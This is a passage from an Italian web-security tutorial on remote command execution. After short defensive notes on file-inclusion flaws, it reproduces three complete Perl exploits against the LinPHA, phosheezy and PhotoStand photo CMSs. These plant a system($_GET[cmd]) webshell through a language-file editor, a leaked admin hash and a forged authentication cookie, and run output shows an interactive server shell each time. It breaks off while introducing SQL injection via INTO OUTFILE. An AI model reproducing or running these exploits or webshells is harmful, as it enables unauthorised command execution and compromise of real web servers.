#### Possibilità di scrittura di codice aritrario su file .txt e conpresenza di LFI

Anche in questo caso, basta inserire opportuni filtri in modo tale da impedire che l'utente scriva in modo totalmente libero codice dannoso.
Ad ogni modo, poichè i dati che l'utente ha scritto vanno a finire su un file `.txt,` senza la presenza di una Local File Inclusion sarà impossibile arrivare a eseguire comandi sul server.
Basta quindi scrivere codice sicuro, e impedire che lo script sia vulnerabile a Local File Inclusion.

#### RCE tramite RFI

Poichè una RFI si può trasformare facilmente in una RCE, basta solamente evitare di rendere un sito vulnerabile a REmote File Inclusion. Il come, è già stato spiegato nel capitolo RFI.

#### RCE tramite LFI (Log Poisoning)

Poichè in questo caso entrano in gioco i Log Di Apache, per evitare questa RCE basterebbe evitare la Local File Inclusion. In quanto senza LFI, sarà impossibile includere ed eseguire il codice malevolo scritto nei log di Apache. Come difendersi da LFI è già stato spiegato nel capitolo LFI.

# Vari Exploit e Spiegazioni

In questa sezione vi illustrerò degli exploit di Remote Command Execution scritti direttamente da me.

## LinPHA Photo Gallery RCE
Andiamo a vedere un primo exploit, interessante il cms LinPHA Photo Gallery.

Questo cms era buggato a varie vulnerabilità. Innanzitutto era possibile creare una nuova lingua, lingua che sarebbe diventata un file `.php` .
Poi era pure possibile modificarla, quindi inserire al suo interno codice php malevolo, il classico `system($_GET[cmd])` . Quindi poi era possibile eseguire comandi arbitrari sulla nuova lingua creata e modificata. Andiamo a vedere l'exploit.

Vediamo i file vulnerabili interessati:
*/lib/lang/language.php*

Grazie a questo file possiamo creare la nuova lingua, e modificarla:

```php
<?php
	
switch($_REQUEST['action'])
{
  case "create_file":
    create_new_file(@$_POST['filename']);
  break;
  case "edit_lang":
    edit_lang_files($_REQUEST['language']);
  break;
  case "save_lang":
    save_lang_files($_POST['language'], $_POST['phrase']);
  break;
}

function create_new_file($filename) // Funzione per creare una nuova Lingua
{
  
  if(false == isset($filename))
  {
  echo "Please enter the name of new language file to create " .
    "(e.g. German, French, Japanese...). A file named lang.Yourlang.php " .
    "will be created which you can edit later.<br />" .
    "<form method='POST' action=".$_SERVER['PHP_SELF'].">" .
    "Language to create: " .
    "<input type='text' name='filename'></td></tr>" .
    "<input type='hidden' name='action' value='create_file'>&nbsp;" .
    "<input type='submit' name='submit' value='submit'>" .
    "</form>";
  }
  else
  {
    
  $langfile = LINPHA_DIR."/lib/lang/lang.".$filename.".php"; // Il percorso della nuova lingua che sta per essere creata
  
  if(true == file_exists($langfile))
  {
    die("File already exists! Please remove first - aborting!");
  }
  /**
   * create empty language file
   */
  $file_data = "<?php\n";
  $file_data .= "\$translate = array (\n\n";
  $file_data .= ");\n";
  $file_data .= "?>"; 
      
  $fp = fopen("$langfile", "w+"); // Qui viene creata la nuova lingua, che avrà il seguente nome: lang.".$filename.".php
  fwrite($fp, $file_data);
  fclose($fp);
  chmod($langfile, 0644);
  
  echo "Fine - now please go " .
    "<a href='".$_SERVER['PHP_SELF']."?action=edit_lang&language=".$filename."'>here<a> " .
    "and start translating";
  }
}


function edit_lang_files($langfile) // Funzione per modificare una lingua
{
  global $translate;  
  $langfile = LINPHA_DIR."/lib/lang/lang.".$langfile.".php";
  $tmpfile = LINPHA_DIR."/var/tmp/lang.temp.txt";
  
  if(file_exists("$langfile") && file_exists("$tmpfile"))
  {
    include_once("$langfile");
    $collected = file("$tmpfile");
  }
  else
  {
    die("Failed to include: ".$langfile."");
  }

  /**
   * collect missing entries in langfile
   */
  foreach($collected as $phrase)
  {
    if(false == array_key_exists(trim($phrase), $translate))
    {
      $new_phrases[] = $phrase; 
    }
  } 

  if(false == isset($new_phrases))
  {
    echo "FINE - Your language file  is up to date";    
  }
  else
  {
  echo "<table width='80%' colspan='0' rowspan='0'>" .        // Ecco i form che porteranno alla sucessiva funzione che modicherà la lingua
    "<tr><td colspan='2'>" .
      "Please translate all missing entries" .
    "</td></tr>" .
    "<form method='POST' action=".$_SERVER['PHP_SELF'].">" .
    "<tr>";
    
    foreach($new_phrases as $phrase2tr)
    {
      echo "<td width='30%'>$phrase2tr</td>" .
        "<td><input type='text' name='phrase[$phrase2tr][]'></td></tr>";
    }
  
  echo "<input type='hidden' name='action' value='save_lang'>" .
    "<input type='hidden' name='language' value='$langfile'>" .
    "<tr><td colspan='2'>" .
      "<input type='submit' name='submit' value='submit'>" .
    "</td></tr>" .
    "</form></table>";
  }
}


function save_lang_files($langfile, $phrases) // Funzione per salvare la lingua modificata
{

  if(file_exists($langfile))
  {
    include_once($langfile);
  }
  
  /**
   * merge already found translation phrases with the new ones  
   */
  while (list($phrase, $translation) = each($phrases))
  {
    foreach($translation as $translated)
    {
      if(false == empty($translated))
      {
        $translate[$phrase] = $translated; 
      }
    }
  }
  
  /**
   * temporary save last array entry.
   */
  $last_key = end(array_keys($translate));
  reset($translate);
  $last_value = array_pop($translate);
  reset($translate);
  
  /**
   * create language file           
   */
  $file_data = "<?php\n";
  $file_data .= "\$translate = array (\n";

  while(list($phrase , $translation) = each($translate))
  {
    $file_data .= "\"".trim($phrase)."\""." => "."\"$translation\","."\n";  
  }   
  
  $file_data .= "\"".trim($last_key)."\""." => "."\"$last_value\"\n";
  $file_data .= ");\n";
  $file_data .= "?>"; 
      
  copy($langfile, $langfile.".bak");
  $fp = fopen("$langfile", "w+");
  fwrite($fp, $file_data);
  fclose($fp);
  chmod($langfile, 0644);

}
```

Inizialmente la lingua creata avrà questo all'interno del file:

```php
<?php
$translate = array (

);
?>
```

Dunque, per inserire correttamente il `system($_GET[cmd])`, dovremmo prima di tutto chiudere l'array translate.
Dato che al nell'array verrà messo Albums => "parametro nostro", dobbiamo fare una piccola modifica.
Chiudere l'array, inizializzare il system, aprire un altro array per chiudere correttamente il ); finale.

Dunque andremo a inserire:
`");system($_GET[cmd]);$a= array(""`

La lingua diventerà dunque:

```php
<?php
$translate = array (
"Albums" => "");system($_GET[cmd]);$a= array(""
);
?>
```

La vulnerabilità di remote command execution è stata creata.

Vediamo l'exploit ora ;)

```perl
#!/usr/bin/perl

# -----------------------------------------------------------------------------------------------------------------------
#                      INFORMATIONS
# -----------------------------------------------------------------------------------------------------------------------
# LinPHA Photo Gallery 2.0 Alpha
# http://sourceforge.net/project/downloading.php?group_id=64772&use_mirror=heanet&filename=linpha2-alpha1.tar.gz&94291669
# Remote Command Execution Exploit
# by Osirys
# osirys[at]live[dot]it
# osirys.org

# Tested in local with: magic quotes => Off

# LIBRERIE NECESSARIE

use LWP::UserAgent;
use IO::Socket;
use HTTP::Request::Common;

# DICHIARAZIONE E ASSEGNAZIONE DELLE VARIABILI

my $new_lang_name = "freedom";
my $add_lang_path = "/lib/lang/language.php?action=create_file";
my $edt_lang_path = "/lib/lang/language.php?action=edit_lang&language=";
my $rce_path      = "/lib/lang/lang".$new_lang_name.".php";
my $phpc0de       = "%22%29%3Bsystem%28%24_GET%5Bcmd%5D%29%3B%24a%3D+array%28%22";
my $i = 0;
my $c = 0;
my $host   = $ARGV[0];

($host) || help("-1");
cheek($host) == 1 || help("-2");
&banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

&new_lang_create($new_lang_name);

# QUI VIENE CREATA LA NUOVA LINGUA, E SE ESISTE GIÀ, VIENE CREATA UNA NUOVA ANCORA

sub new_lang_create() {
    my $new_lang_name = $_[0];
    my $url = $host.$add_lang_path;

    my $ua = LWP::UserAgent->new;
    my $re = $ua->request(POST $url,
                                   Content_Type => 'form-data',
                                   Content      => [
                                                     filename => $new_lang_name,
                                                     action   => 'create_file',
                                                     submit   => 'submit'
                                                   ]
                         );

    if (($re->is_success)&&($re->as_string =~ /File already exists!/)) {
        $i++;
        print "[+] Language already exists, creating a new one ..\n";
        $new_lang_name = "freedom".$i;
        $edt_lang_path = "/lib/lang/language.php?action=edit_lang&language=".$new_lang_name;
        &new_lang_create($new_lang_name);
    }
    elsif (($re->is_success)&&($re->as_string =~ /Fine - now please go/)) {
        print "[+] New Language added !\n";
        &new_lang_edit($new_lang_name);
    }
    else {
        print "[-] Unable to add a new language\n";
        print "[-] Exploit Failed\n\n";
        exit(0);
    }
}

# SE LA LINGUA VIENE CREATA, ORA VIENE MODIFICATA, VIENE QUINDI INSERITO AL SUO INTERNO IL CODICE PHP MALEVOLO CHE PORTERÀ ALLA RCE
# LA RICHIESTA VIENE FATTA COI SOCKET

sub new_lang_edit() {
    my $new_lang_name = $_[0];
    my $url  = $path.$edt_lang_path;
    my $code = "phrase%5BAlbums%0D%0A%5D%5B%5D=".$phpc0de."&phrase%5BExtended+Search%0D%0A%5D%5B%5D=".
               "&phrase%5BHi%2C+this+is+the+home+of+%22The+PHP+Photo+Archive%22+%3Ca+href%3D%22http%".
               "3A%2F%2Flinpha.sf.net%22%3Eaka+LinPHA%3C%2Fa%3E.%0D%0A%5D%5B%5D=&phrase%5BHome%0D%0A".
               "%5D%5B%5D=&phrase%5BLinpha+Syslog%0D%0A%5D%5B%5D=&phrase%5BLogin%0D%0A%5D%5B%5D=&phr".
               "ase%5BPassword%0D%0A%5D%5B%5D=&phrase%5BRemember+Me%0D%0A%5D%5B%5D=&phrase%5BSearch%".
               "0D%0A%5D%5B%5D=&phrase%5BUsername%0D%0A%5D%5B%5D=&phrase%5BWelcome%0D%0A%5D%5B%5D=&p".
               "hrase%5BYou+must+have+cookies+enabled+to+log+in.%0D%0A%5D%5B%5D=&action=save_lang&la".
               "nguage=..%2F..%2Flib%2Flang%2Flang.".$new_lang_name.".php&submit=submit";
    my $length = length($code);
    my $data = "POST ".$url." HTTP/1.1\r\n".
               "Host: ".$h0st."\r\n".
               "Keep-Alive: 300\r\n".
               "Connection: keep-alive\r\n".
               "Content-Type: application/x-www-form-urlencoded\r\n".
               "Content-Length: ".$length."\r\n\r\n".
               $code."\r\n";

    my $socket   =  new IO::Socket::INET(
                                          PeerAddr => $h0st,
                                          PeerPort => '80',
                                          Proto    => 'tcp',
                                        ) or die "[-] Can't connect to $h0st:80\n[?] $! \n\n";

    print "[+] Editing new Language ..\n";
    $socket->send($data);

    while ((my $e = <$socket>)&&($inj_t != 1)) {
        if ($e =~ /Welcome To LinPHA2 Translation Module/) {

## A QUESTO PUNTO LA LINGUA È STATA OPPORTUNAMENTE MODIFICATA, ==> RCE
            print "[+] New Language Edited !\n";
            print "[*] Hi my master, execute your commands !\n\n";
            $inj_t = 1;
        }
    }
    $inj_t == 1 || die "[-] Unable to edit new Language ! \n";

    &exec_cmd($new_lang_name);
}

sub exec_cmd() {

# QUI VENGONO ESEGUITI I COMANDI SUL FILE DELLA LINGUA CREATA E MODIFICATA

    my $new_lang_name = $_[0];
    my @outs;
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print "shell[$h0st]\$> ";
    $cmd = <STDIN>;
    $cmd !~ /exit/ || die "[-] Quitting ..\n";
    $rce_path = "/lib/lang/lang.".$new_lang_name.".php";
    $exec_url = ($host.$rce_path."?cmd=".$cmd);
    $re = get_req($exec_url);
    if ($re =~ /(.*)/) {
        push(@outs,$re);
        foreach my $o(@outs) {
            print "$o";
        }
        &exec_cmd;
    }
    elsif ($re !~ /[a-z0-9]/) {
        $c++;
        print "bash: ".$cmd.": command not found\n";
        $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
        &exec_cmd;
    }
}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub banner {
    print "\n".
          "  ------------------------------------------- \n".
          "      LinPHA 2.0a Code Execution Exploit      \n".
          "                Coded by Osirys               \n".
          "  ------------------------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Bad hostname! \n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
    exit(0);
}
```


Vediamo l'exploit in azione.
```
osirys[~]>$ perl rce.txt http://localhost/linpha2/

   -------------------------------------------
       LinPHA 2.0a Code Execution Exploit
                 Coded by Osirys
   -------------------------------------------

 [+] New Language added !
 [+] Editing new Language ..
 [+] New Language Edited !
 [*] Hi my master, execute your commands !

 shell[localhost]$> id
 uid=80(apache) gid=80(apache) groups=80(apache)
 shell[localhost]$> ls
 lang.freedom.php
 lang.freedom.php.bak
 language.php
 language.php~
 shell[localhost]$> pwd
 /home/osirys/web/linpha2/lib/lang
 shell[localhost]$> exit
 [-] Quitting ..
 osirys[~]>$
```
 
Come si può ben notare, siamo riusciti ad eseguire comandi arbitrari sul server.

## phosheezy RCE
Andiamo ora a vedere un'altro exploit ancora, sempre di tipo Remote Command Execution.

Il cms vulnerabile è phosheezy. Il primo bug di cui è afflitto il cms è: Admin Details Disclosure. Il cms utilizza un semplice file di testo per salvare le password criptate in SHA1.
Una volta trovata la password dell'amministratore dunque, era possibile loggarsi come admin. Nel pannello di amministrazione era poi possibile modificare il temaple, indovinate un pò.

L'exploit inserisce nel template in classico `system($_GET[cmd])`.

Analizziamo il sorgente dell'exploit ..

```perl
#!/usr/bin/perl

# phosheezy 2.0
# http://www.ryneezy.net/apps/phosheezy/phosheezy-v0.2.tar.gz
# Remote Command Execution Exploit
# by Osirys
# osirys[at]live[dot]it
# osirys.org

# LIBRERIE RICHIESTE

use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;

# DICHIARAZIONE E ASSEGNAMENTO DELLE VARIABILI

my $host       =  $ARGV[0];
my $pwd_path   =  "/config/password";
my $adm_path   =  "/admin.php";
my $templ_path =  "/admin.php?action=3";

help("-1") unless ($host);
cheek($host) == 1 || help("-2");
&banner;

$datas = get_data($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

# QUI VIENE PRESA LA PASSWORD DELL'AMMINISTRATORE

my $url = $host.$pwd_path;
my $re = get_req($url);

if ($re =~ /([0-9a-f]{40})/) {
    $password = $1;
    print "[+] Admin password found:\n";
    print "    Sha1 pwd: $password  \n";
    adm_log($password);
}
else {
    print "[-] Unable to get sha1 Admin password\n\n";
    exit(0);
}

sub adm_log() {

# SE È STATA PRESA LA PASSWORD, È IL MOMENTO DI LOGGARSI

    my $password =  $_[0];
    my $link     =  $path.".".$adm_path;
    my $post     =  "password=$password&Login=Login";
    my $length   =  length($post);
    my @data;
    my $socket   =  new IO::Socket::INET(
                                          PeerAddr => $h0st,
                                          PeerPort => '80',
                                          Proto    => 'tcp',
                                        ) or die $!;

    my $data = "POST ".$link." HTTP/1.1\r\n".
               "Host: ".$h0st."\r\n".
               "Content-Type: application/x-www-form-urlencoded\r\n".
               "Content-Length: ".$length."\r\n\r\n".
               $post."\r\n";

    $socket->send($data);

# IL CMS PER VERIFICARE CHE CI SI È LOGGATI COME AMMINISTRATORI, VERIFICA IL PHPSESSID, FA UN CONTROLLO QUINDI SULLA VARIABILE D'AMBIENTE $SESSION
# DATO CHE CI SIAMO LOGGATI CORRETTAMENTE, L'EXPLOIT RECUPERA IL SUO PHPSESSID DA INVIARE POI NELLE PROSSIME RICHIESTE PER FAR CAPIRE AL CMS CHE CI SIAMO LOGAGTI COME AMMINISTRATORI

    print "[+] Grabbing server headers to get a valid SESSION ID ..\n";

    while (my $e = <$socket>) {
        push(@data,$e);
    }
    foreach my $e(@data) {
        if ($e =~ /Welcome to Ryneezy PhoSheezy web administration/) {
            $log_ = 1;
            print "[+] Succesfully logged in as Administrator\n";
        }
        elsif ($e =~ /Set-Cookie: PHPSESSID=([0-9a-z]{1,50});/) {
            $phpsessid = $1;
            print "[+] SESSION ID grabbed: $phpsessid\n";
        }
    }

    (($log_)&&($phpsessid)) || die "[-] Exploit failed -> Login Failed or SESSION ID not grabbed!\n";
    RCE_create($phpsessid);
}

sub RCE_create() {

# A QUESTO PUNTO È ORA DI MODIFICARE IL TEMPLATE, INSERENDO AL SUO INTERNO IL CODICE PHP VULNERABILE A RCE 

    my $phpsessid = $_[0];
    my $link     =  $path.".".$templ_path;
    my $code = "header=<html><head><title>Ryneezy PhoSheezy</tit".
               "le></head><body bgcolor=\"#ffffff\" text=\"#0000".
               "00\">&footer=</body></html><!-- cmd --><?php sys".
               "tem(\$_GET[cmd]);?><!--cmd-->&Submit=Edit Layout";
    my $length =  length($code);

    my $socket = new IO::Socket::INET(
                                       PeerAddr => $h0st,
                                       PeerPort => '80',
                                       Proto    => 'tcp',
                                     ) or die $!;

    my $data = "POST ".$link." HTTP/1.1\r\n".
               "Host: ".$h0st."\r\n".
               "Cookie: PHPSESSID=".$phpsessid."; hotlog=1\r\n".
               "Content-Type: application/x-www-form-urlencoded\r\n".
               "Content-Length: ".$length."\r\n\r\n".
               "$code\r\n";

    $socket->send($data);

    while (my $e = <$socket>) {
        if ($e =~ /Edit layout again/) {
            $rce_c = 1;
            print "[+] Template edited, RCE Vulnerability Created !\n";
        }
    }

    $rce_c == 1 || die "[-] Can't edit Template. Exploit failed\n\n";
    &exec_cmd;
}

sub exec_cmd {

# ECCOCI FINALMENTE AD ESEGUIRE COMANDI

    print "shell\$> ";
    $cmd = <STDIN>;
    $cmd !~ /exit/ || die "[-] Quitting ..\n";
    $exec_url = ($host."/index.php?cmd=".$cmd);
    $re = get_req($exec_url);
    if ($re =~ /<!-- cmd -->(.*)/) {
        my $cmd = $1;
        $cmd =~ s/<!--cmd-->/[-] Undefined output or bad cmd !/;
        print "$cmd\n";
        &exec_cmd;
    }
    else {
        print "[-] Undefined output or bad cmd !\n";
        &exec_cmd;
    }
}

sub get_req() {
    $link   = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua  = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_data() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $h0st !~ /www/ || $h0st =~ s/www\.//;
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub banner {
    print "\n".
          "  ---------------------------- \n".
          "     Phosheezy RCE Exploit     \n".
          "        Coded by Osirys        \n".
          "  ---------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Cheek that you provide a hostname address!\n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
    exit(0);
}

```

Vediamo l'exploit in azione:
```
osirys[~]>$ perl exp.txt http://localhost/phosheezy/

   ----------------------------
      Phosheezy RCE Exploit
         Coded by Osirys
   ----------------------------

 [+] Admin password found:
     Sha1 pwd: 8942c747dc48c47a6f7f026df85a448046348a2c
 [+] Grabbing server headers to get a valid SESSION ID ..
 [+] SESSION ID grabbed: 3srqiuh8jrttt73tbd7j5uvhi2
 [+] Succesfully logged in as Administrator
 [+] Template edited, RCE Vulnerability Created !
 shell$> id
 uid=80(apache) gid=80(apache) groups=80(apache)
 shell$> exit
 [-] Quitting ..
osirys[~]>$
```

## PhotoStand RCE
Vi mostro ora sempre un altro exploit, di tipo Remote Command Execution, che ho scritto per sfruttare diverse falle su un cms. L'applicazione in question è: PhotoStand.

Questa App era afflitta da una vulnerabilità di tipo AUTH BYPASS. L'autenticazione proveniva da cookie. La vulnerabiltà era un misto tra una Insecure Cookie Handling, e un AUTH BYPASS di tipo SQL.
Creando un cookie con contenuto il nickname dell'amministratore, criptato in BASE64, questo veniva messo in una query SQL, che ci garantiva l'accesso.
L'exploit dunque crea un cookie con contenuto il nickname dell'amministratore criptato in BASE64, poi una volta loggato come admin, modifica il file del template inserendo il classico: `system($_GET[cmd]);`.
L'exploit è in grado di prendere il contenuto del template, in modo da non modificarlo, inserisce infatti solo la stringa vulnerabile a RCE, senza modificare alcun dato nel template.

```perl
#!/usr/bin/perl

# -------------------------------------------------------------------------------------
# Exploit tested in Local :
# -------------------------------------------------------------------------------------
# osirys[~]>$ perl r0x.txt http://localhost/photostand_1.2.0/photostand_1.2.0/ admin
#
#   ----------------------------
#      Photobase RCE Exploit
#         Coded by Osirys
#   ----------------------------
#
# [*] Bypassing Admin Login with a evil cookie !
# [+] SESSION ID grabbed: sbt9f85ps9n29an2d31911n806
# [*] Admin Login Bypassed !
# [*] Template source Found, editing it ..
# [*] Template edited, backdoored !!
# [*] Shell succesfully spawned !!
# [:D Hi myLord, execute your commands !!
#
# shell[localhost]$> id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$> pwd
# /home/osirys/web/photostand_1.2.0/photostand_1.2.0/templates/Simplified
# shell[localhost]$> exit
# [-] Quitting ..
#
# osirys[~]>$
# -------------------------------------------------------------------------------------

use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;
use URI::Escape;
use MIME::Base64;

my $host  =  $ARGV[0];
my $user  =  $ARGV[1];
my $rand  =  int(rand 150);
my $rand1 =  "1337".$rand;
my $rce   =  "<?php if(isset(§§§_GET[cmd])) {echo \"<br>$rand1<br>\";system(§§§_GET[cmd]);echo \"$rand1<br>\";}?>";
my $rce_p =  "/templates/Simplified/index.php?cmd=";


## STEP 1: CREAZIONE DEL COOKIE CON CONTENUTO IL NICK DELL'ADMIN CRIPTATO IN BASE64
chomp($user);
$cookie = encode_base64($user);
$cookie =~ s/\%([A-Fa-f0-9]{2})/pack('C', hex($1))/seg;
$cookie =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;

help("-1") unless (($host)&&($user));
cheek($host) == 1 || help("-2");
&banner;

$datas = get_data($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);


## STEP 2: TENTATIVO DI LOGIN, E VERIFICA DEL BYPASSING
print "[*] Bypassing Admin Login with a evil cookie !\n";
socket_req("GET",$path."/admin/index.php",$cookie,"",1);
$phpsessid || die "\n[-] Can't login with evil Cookie !\n\n";
$cookie .= "; PHPSESSID=".$phpsessid;
socket_req("GET",$path."/admin/newart.php",$cookie,"",2,"New article<\/title>");
$gotcha == 1 || die "\n[-] Can't login with evil Cookie !\n\n";
print "[*] Admin Login Bypassed !\n";
socket_req("GET",$path."/admin/options.php?page=editor&edit=Simplified",$cookie,"",3);


## STEP 3: VERIFICA E COPIA DEL TEMPLATE PRECEDENTE
my $re = join '', @tmp_out;
my $content = tag($re);
if ($content =~ /class="textbox">(.+)<\/textarea>/) {
    $template = $1;
    print "[*] Template source Found, editing it ..\n";
}
else {
    print "[-] Template source not Found, exiting ..\n";
    exit(0);
}


## STEP 4: MODIFICA DEL TEMPLATE, INSERENDOVI ALL'INTERNO LA STRINGA VULNERABILE A RCE: "system($_GET[cmd])"
$template =~ s/(.+)/$rce$1/;
$template =~ s/\*/\n/g;
$template =~ s/\$/ /g;
$template =~ s/§§§/\$/g;
$template =~ s/\( _GET/(\$_GET/g;
my $code = uri_escape($template);
$code =~ s/\(/%28/g;
$code =~ s/\)/%29/g;
$code =~ s/%20/+/g;
$code =~ s/'/%27/g;
$code =~ s/!/%21/g;

my $post = "action=save&tpid=4&tp=index.php&template=Simplified&type=1&page=editor&editpage=".$code;
socket_req("POST",$path."/admin/options.php",$cookie,$post,0,"",1);


##STEP 5: VERIFICA DELLA MODIFICA DEL TEMPLATE, IN CASO AFFERMATIVO: SPAWINING DI UNA SHELL :P
my $exec_url = ($host.$rce_p."id");
my $re = get_req($exec_url);
if ($re =~ /uid=/) {
    print "[*] Template edited, backdoored !!\n[*] Shell succesfully spawned !!\n[:D Hi myLord, execute your commands !!\n\n";
    &exec_cmd;
}
else {
    print "[-] Something wrong, sploit failed !\n\n";
    exit(0);
}

sub socket_req() {
    my($request,$path,$cookie,$content,$opt,$regexp,$sock_opt) = @_;
    my $stop;
    my $length = length($content);
    my $socket   =  new IO::Socket::INET(
                                            PeerAddr => $h0st,
                                            PeerPort => '80',
                                            Proto    => 'tcp',
                                         ) or die $!;

    if ($sock_opt == 1) {
        $opt_1 = "Referer: ".$host."/admin/options.php?page=editor&edit=Simplified\r\n";
        $opt_2 = "Content-Type: application/x-www-form-urlencoded\r\n";
    }
    else {
        $opt_1 = "";
        $opt_2 = "";
    }
    my $data = $request." ".$path." HTTP/1.1\r\n".
               "Host: ".$h0st."\r\n".
               "Keep-Alive: 300\r\n".
               "Connection: keep-alive\r\n".
               $opt_1.
               "Cookie: PS-SAVE=".$cookie."\r\n".
               $opt_2.
               "Content-Length: ".$length."\r\n\r\n".
               $content."\r\n";

    $socket->send($data);
    while ((my $e = <$socket>)&&($stop != 1)) {
        if ($opt == 0) {
            $stop = 1;
        }
        elsif ($opt == 1) {
            if ($e =~ /Set-Cookie: PHPSESSID=([0-9a-z]{1,50});/) {
                $phpsessid = $1;
                print "[+] SESSION ID grabbed: $phpsessid\n";
                $stop = 1;
            }
        }
        elsif ($opt == 2) {
            if ($e =~ /$regexp/) {
                ($stop,$gotcha) = (1,1);
            }
        }
        elsif ($opt == 3) {
            push(@tmp_out,$e);
        }

    }
}

sub exec_cmd {
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print "shell[$h0st]\$> ";
    $cmd = <STDIN>;
    $cmd !~ /exit/ || die "[-] Quitting ..\n\n";
    $exec_url = $host.$rce_p.$cmd;
    my $re = get_req($exec_url);
    my $content = tag($re);
    if ($content =~ m/<br>$rand1<br>(.+)$rand1<br>/g) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        chomp($out);
        print "$out\n";
        &exec_cmd;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print "bash: ".$cmd.": command not found\n";
        $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
        &exec_cmd;
    }

}

sub get_req() {
    $link   = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua  = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.+)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_data() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $h0st !~ /www/ || $h0st =~ s/www\.//;
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
}

sub banner {
    print "\n".
          "  ---------------------------- \n".
          "     PhotoStand RCE Exploit    \n".
          "         Coded by Osirys       \n".
          "  ---------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Bad Input!\n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path admin_username\n";
    print "    admin_username is the nick of the admin.\n\n";
    exit(0);
}
```

Vediamo l'exploit eseguito in locale:
```
osirys[~]>$ perl r0x.txt http://localhost/photostand_1.2.0/photostand_1.2.0/ admin

  ----------------------------
     Photobase RCE Exploit
        Coded by Osirys
  ----------------------------

[*] Bypassing Admin Login with a evil cookie !
[+] SESSION ID grabbed: sbt9f85ps9n29an2d31911n806
[*] Admin Login Bypassed !
[*] Template source Found, editing it ..
[*] Template edited, backdoored !!
[*] Shell succesfully spawned !!
[:D Hi myLord, execute your commands !!

shell[localhost]$> id
uid=80(apache) gid=80(apache) groups=80(apache)
shell[localhost]$> pwd
/home/osirys/web/photostand_1.2.0/photostand_1.2.0/templates/Simplified
shell[localhost]$> exit
[-] Quitting ..

osirys[~]>$
```
 
Come possiamo notare, l'exploit dopo aver creato il cookie e dopo essersi loggato, ha modificato il template, e ha "regalato" all'attacker una carina shell :)

## Da SQL Injection A RCE

Andiamo ora a vedere una specie di nuova tecnica: esecuzione di comandi da SQL Injection, una specie di: "From SQL Inj to RCE" :)
Premetto: questa tecnica non funziona sempre, ci sono infatti molto condizioni che devono avverarsi affinchè la tecnica porti correttamente ad una vera e propria esecuzione di comandi remota.

Analizziamola:

Quando una Web App o uno script, è vulnerabile a SQL Injection, è possibile manipolare le query SQL che interrogano il database. Nell'SQL è presente una funzione molto interessante:

`INTO OUTFILE`. Questa funzione permette l'utente di scrivere dati su un file. Lascio a voi trarre le conclusioni.
La sintassi corretta dell'uso di questa funzione è: `SELECT 'dati' INTO OUTFILE 'path di destinazione'`.

Come si può notare, la sintassi richiede l'uso del `'`, quindi già questa è una limitazione, in quanto se i Magic Quotes sono ON, la `'` verrà `escapata`, diventando dunque `\'`, bloccando quindi il nostro tentativo di creazione di un file.

Dunque, la prima condizione affinchè la tecnica funzioni, è quella che i MQ siano OFF, oppure che, in caso di MQ On, i dati immessi dall'utente siano elaborati dalla funzione `stripslashes`.

In caso di MQ ON infatti, una ` ' ` inserita dall'attacker diventerà `\'`, ma una volta passata alla funzione stripslashes, l'escape `\` verrà tolto, quindi la ` ' ` verrà conservata.

Definizione di Stripslashes:

